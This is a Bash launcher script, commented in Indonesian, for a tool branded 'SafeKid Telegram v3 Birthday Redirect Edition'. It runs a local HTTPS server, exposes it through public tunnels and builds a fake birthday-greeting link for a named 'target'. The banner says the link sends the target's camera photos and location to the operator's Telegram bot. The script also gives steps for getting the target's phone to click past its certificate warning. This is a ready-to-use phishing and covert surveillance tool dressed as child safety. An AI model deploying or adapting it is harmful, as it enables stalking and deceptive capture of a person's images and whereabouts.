#!/bin/bash
# ================================================================
#   SafeKid Telegram v3
#   Jalankan: bash safekid.sh
#   File HTML sudah ada di folder public/ — tidak digenerate ulang
# ================================================================

R='\033[1;31m'; G='\033[1;32m'; Y='\033[1;33m'
C='\033[1;36m'; W='\033[1;37m'; N='\033[0m'

DIR="$(cd "$(dirname "$0")" && pwd)"
PUBLIC="$DIR/public"
SERVER="$DIR/server.js"
CONFIG="$DIR/config.env"
PORT=3000        # HTTPS
PORT_HTTP=3001   # HTTP redirect
TUNNEL_LOG="$DIR/tunnel.log"
SERVER_LOG="$DIR/server.log"
PID_FILE="$DIR/server.pid"

cleanup() {
  echo -e "\n${Y}[*] Stopping...${N}"
  [ -f "$PID_FILE" ] && kill "$(cat $PID_FILE 2>/dev/null)" 2>/dev/null && rm -f "$PID_FILE"
  pkill -f "node.*server.js" 2>/dev/null
  pkill -f "ssh.*serveo"     2>/dev/null
  pkill -f "ssh.*localhost.run" 2>/dev/null
  pkill -f "ngrok"           2>/dev/null
  fuser -k ${PORT}/tcp       2>/dev/null || true
  echo -e "${G}[✓] Bye!${N}"; exit 0
}
trap cleanup INT TERM EXIT

# ── Banner ──
clear
echo -e "${C}"
echo '  ╔══════════════════════════════════════════╗'
echo '  ║   🛡️  SafeKid Telegram v3                 ║'
echo '  ║   Birthday Redirect Edition               ║'
echo '  ╠══════════════════════════════════════════╣'
echo -e "  ║  ${G}[✓]${C} Halaman ulang tahun (birthday.html)  ║"
echo -e "  ║  ${G}[✓]${C} Foto & lokasi → Telegram             ║"
echo -e "  ║  ${G}[✓]${C} Zero npm dependencies                ║"
echo '  ╚══════════════════════════════════════════╝'
echo -e "${N}"

# ── Cek file ──
echo -e "${Y}[*] Checking files...${N}"
for f in "$SERVER" "$PUBLIC/birthday.html" "$PUBLIC/index.html" "$PUBLIC/child.html" "$PUBLIC/parent.html"; do
  if [ ! -f "$f" ]; then
    echo -e "${R}[!] File tidak ditemukan: $f${N}"
    echo -e "${Y}    Pastikan semua file ada di folder yang benar!${N}"
    exit 1
  fi
  echo -e "${G}[✓] $(basename $f)${N}"
done

# ── Check deps ──
IS_TERMUX=false
[ -d "/data/data/com.termux" ] && IS_TERMUX=true
if ! command -v node &>/dev/null; then
  echo -e "${R}[!] Node.js belum install!${N}"
  $IS_TERMUX && pkg install nodejs -y || exit 1
fi
echo -e "${G}[✓] Node.js $(node -v)${N}"
! command -v ssh  &>/dev/null && $IS_TERMUX && pkg install openssh -y 2>/dev/null
! command -v curl &>/dev/null && $IS_TERMUX && pkg install curl    -y 2>/dev/null
command -v qrencode &>/dev/null || ($IS_TERMUX && pkg install qrencode -y 2>/dev/null)

# ── Setup Bot ──
echo ""
echo -e "${C}══ TELEGRAM BOT ══${N}"
if [ -f "$CONFIG" ]; then
  source "$CONFIG"
  echo -e "${G}[✓] Config: token ${BOT_TOKEN:0:15}... | chat $CHAT_ID${N}"
  echo -ne "  Gunakan config ini? (y/n) [y]: "; read ans; ans="${ans:-y}"
  if ! [[ "$ans" =~ ^[Yy] ]]; then
    rm "$CONFIG"
  fi
fi

if [ ! -f "$CONFIG" ]; then
  echo ""
  echo -e "${Y}  Cara dapat Token & Chat ID:${N}"
  echo -e "  1. Telegram → ${C}@BotFather${N} → /newbot → salin Token"
  echo -e "  2. Buka bot → Start"
  echo -e "  3. Buka: ${C}https://api.telegram.org/botTOKEN/getUpdates${N}"
  echo -e "     Cari ${Y}\"id\"${N} dalam ${Y}\"chat\"${N}"
  echo ""
  echo -ne "${Y}  Bot Token : ${N}"; read BOT_TOKEN
  BOT_TOKEN=$(echo "$BOT_TOKEN" | tr -d ' \r\n\t')
  echo -ne "${Y}  Chat ID   : ${N}"; read CHAT_ID
  CHAT_ID=$(echo "$CHAT_ID" | tr -d ' \r\n\t')
  [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ] && { echo -e "${R}[!] Wajib diisi!${N}"; exit 1; }

  echo -e "${C}[*] Testing...${N}"
  RESP=$(curl -s --max-time 10 "https://api.telegram.org/bot${BOT_TOKEN}/getMe")
  if echo "$RESP" | grep -q '"ok":true'; then
    BOT_NAME=$(echo "$RESP" | grep -o '"username":"[^"]*"' | cut -d'"' -f4)
    echo -e "${G}[✓] Bot @${BOT_NAME} siap!${N}"
  else
    echo -e "${R}[!] Token tidak valid!${N}"; exit 1
  fi
  printf 'BOT_TOKEN=%s\nCHAT_ID=%s\n' "$BOT_TOKEN" "$CHAT_ID" > "$CONFIG"
fi

source "$CONFIG"

# ── Nama target ──
echo ""
echo -e "${C}══ LINK ULANG TAHUN ══${N}"
echo -ne "${Y}  Nama target (contoh: Rina) [Sahabatku]: ${N}"
read TARGET_NAME; TARGET_NAME="${TARGET_NAME:-Sahabatku}"
NAME_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$TARGET_NAME'))" 2>/dev/null || \
           node -e "process.stdout.write(encodeURIComponent('$TARGET_NAME'))" 2>/dev/null || \
           echo "$TARGET_NAME")

# ── Pilih tunnel ──
echo ""
echo -e "${W}  Pilih tunnel:${N}"
echo -e "  ${G}[1]${N} Ngrok         (HTTPS stabil, perlu akun gratis)"
echo -e "  ${G}[2]${N} Localhost.run (gratis, tanpa akun)"
echo -e "  ${G}[3]${N} Serveo.net    (gratis, tanpa akun)"
echo -e "  ${G}[4]${N} Lokal WiFi"
echo -ne "${Y}  SafeKid~# ${N}"; read TC

# ── Kill proses lama ──
echo -e "${Y}[*] Killing old processes...${N}"
fuser -k ${PORT}/tcp     2>/dev/null || true
fuser -k ${PORT_HTTP}/tcp 2>/dev/null || true
OLD=$(lsof -ti:${PORT} 2>/dev/null); [ -n "$OLD" ] && kill -9 $OLD 2>/dev/null || true
pkill -f "node.*server.js" 2>/dev/null; sleep 1

# ── Detect local IP ──
LOCAL_IP=$(ip route get 1 2>/dev/null | awk '{print $7;exit}')
[ -z "$LOCAL_IP" ] && LOCAL_IP=$(ifconfig 2>/dev/null | grep 'inet ' | grep -v '127' | awk '{print $2}' | head -1)
[ -z "$LOCAL_IP" ] && LOCAL_IP="localhost"
echo -e "${G}[✓] IP Lokal: $LOCAL_IP${N}"

# ── Start server ──
echo -e "${Y}[*] Starting HTTPS server...${N}"
SK_PORT="$PORT" SK_PORT_HTTP="$PORT_HTTP" SK_PUBLIC="$PUBLIC" SK_DIR="$DIR" \
  BOT_TOKEN="$BOT_TOKEN" CHAT_ID="$CHAT_ID" PUBLIC_URL="" LOCAL_IP="$LOCAL_IP" \
  node "$SERVER" > "$SERVER_LOG" 2>&1 &
echo $! > "$PID_FILE"
sleep 3

if ! kill -0 "$(cat $PID_FILE 2>/dev/null)" 2>/dev/null; then
  echo -e "${R}[!] Server gagal!${N}"; cat "$SERVER_LOG"; exit 1
fi
echo -e "${G}[✓] Server OK (PID $(cat $PID_FILE))${N}"

# ── Start tunnel ──
PUBLIC_URL=""
case "$TC" in
  1)
    NB=""; command -v ngrok &>/dev/null && NB="ngrok"; [ -f "$HOME/ngrok" ] && NB="$HOME/ngrok"; [ -f "$DIR/ngrok" ] && NB="$DIR/ngrok"
    if [ -z "$NB" ]; then
      ARCH=$(uname -m)
      [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]] && \
        NU="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz" || \
        NU="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz"
      curl -Lo "$HOME/ngrok.tgz" "$NU" && tar xf "$HOME/ngrok.tgz" -C "$HOME/" && chmod +x "$HOME/ngrok"
      NB="$HOME/ngrok"
    fi
    "$NB" config check &>/dev/null 2>&1 || { read -p "ngrok authtoken: " T; "$NB" config add-authtoken "$T"; }
    "$NB" http $PORT --log stdout > "$TUNNEL_LOG" 2>&1 &
    echo -e "${C}[*] Waiting ngrok...${N}"; sleep 5
    PUBLIC_URL=$(curl -s http://localhost:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"https://[^"]*"' | head -1 | cut -d'"' -f4)
    ;;
  2)
    echo -e "${C}[*] Connecting localhost.run...${N}"
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o ConnectTimeout=20 \
        -R 80:localhost:$PORT localhost.run > "$TUNNEL_LOG" 2>&1 &
    TUNNEL_PID=$!; sleep 7
    PUBLIC_URL=$(grep -o 'https://[a-z0-9-]*\.lhr\.life' "$TUNNEL_LOG" 2>/dev/null | head -1)
    [ -z "$PUBLIC_URL" ] && PUBLIC_URL=$(grep -o 'https://[^ ]*' "$TUNNEL_LOG" 2>/dev/null | head -1)
    ;;
  3)
    SUB="safekid$(tr -dc 'a-z0-9' </dev/urandom 2>/dev/null | head -c5 || echo 'abcde')"
    echo -e "${C}[*] Connecting serveo.net...${N}"
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o ConnectTimeout=20 \
        -R ${SUB}:80:localhost:$PORT serveo.net > "$TUNNEL_LOG" 2>&1 &
    sleep 6
    PUBLIC_URL=$(grep -o 'https://[^ ]*serveo\.net[^ ]*' "$TUNNEL_LOG" 2>/dev/null | head -1)
    [ -z "$PUBLIC_URL" ] && PUBLIC_URL="https://${SUB}.serveo.net"
    ;;
  *)
    PUBLIC_URL="https://${LOCAL_IP}:${PORT}"
    echo ""
    echo -e "${Y}╔══════════════════════════════════════════════════════╗${N}"
    echo -e "${Y}║  ⚠️  PENTING: Trust Certificate dulu di HP target!   ║${N}"
    echo -e "${Y}╠══════════════════════════════════════════════════════╣${N}"
    echo -e "${Y}║  1. Buka Chrome di HP target                         ║${N}"
    echo -e "${Y}║  2. Ketik: https://${LOCAL_IP}:${PORT}               ║${N}"
    echo -e "${Y}║  3. Muncul peringatan 'Not Secure'                   ║${N}"
    echo -e "${Y}║  4. Ketuk 'Advanced' → 'Proceed anyway'              ║${N}"
    echo -e "${Y}║  5. Baru buka link birthday                          ║${N}"
    echo -e "${Y}╚══════════════════════════════════════════════════════╝${N}"
    ;;
esac
[ -z "$PUBLIC_URL" ] && PUBLIC_URL="http://localhost:${PORT}"

BIRTHDAY_URL="${PUBLIC_URL}/birthday.html?r=BDAY&n=${NAME_ENC}"

# ── Kirim ke Telegram ──
node -e "
const https=require('https');
const u='$BIRTHDAY_URL', pu='$PUBLIC_URL', token='$BOT_TOKEN', chat='$CHAT_ID', name='$TARGET_NAME';
const t='🛡️ <b>SafeKid Aktif!</b>\n\n🎂 <b>Link Ulang Tahun untuk '+name+':</b>\n<code>'+u+'</code>\n\n📊 Monitor web: '+pu+'/parent.html\n\n<b>Bot commands:</b>\n/status /foto /lokasi /help';
const b=JSON.stringify({chat_id:chat,text:t,parse_mode:'HTML'});
const r=https.request({hostname:'api.telegram.org',path:'/bot'+token+'/sendMessage',method:'POST',headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(b)}},res=>res.resume());
r.on('error',()=>{});r.write(b);r.end();
" 2>/dev/null

# ── Tampilkan hasil ──
echo ""
echo -e "${G}${W}"
echo "  ╔═══════════════════════════════════════════════════════╗"
echo "  ║       🛡️  SafeKid Telegram v3 AKTIF! (HTTPS)          ║"
echo "  ╠═══════════════════════════════════════════════════════╣"
echo -e "  ║  🎂 Kirim link ini ke ${Y}${TARGET_NAME}${W}:"
echo -e "  ║  ${C}${BIRTHDAY_URL}${W}"
echo "  ║"
echo -e "  ║  📊 Monitor web : ${Y}${PUBLIC_URL}/parent.html${W}"
echo -e "  ║  🔒 HTTPS aktif : kamera & lokasi bisa jalan!"
echo -e "  ║  📨 Telegram    : Link sudah dikirim ke bot!"
echo "  ║  Ctrl+C untuk stop"
echo "  ╚═══════════════════════════════════════════════════════╝"
echo -e "${N}"

command -v qrencode &>/dev/null && {
  echo -e "${C}[ QR — Link Ulang Tahun untuk $TARGET_NAME ]${N}"
  qrencode -t ANSIUTF8 "$BIRTHDAY_URL" 2>/dev/null
}

# ── Keepalive tunnel ──
(while true; do
  sleep 20
  case "$TC" in
    2) pgrep -f "ssh.*localhost.run" >/dev/null 2>&1 || \
       ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o ConnectTimeout=20 \
           -R 80:localhost:$PORT localhost.run >> "$TUNNEL_LOG" 2>&1 & ;;
    3) pgrep -f "ssh.*serveo" >/dev/null 2>&1 || \
       ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o ConnectTimeout=20 \
           -R ${SUB:-safekid}:80:localhost:$PORT serveo.net >> "$TUNNEL_LOG" 2>&1 & ;;
  esac
done) &

wait
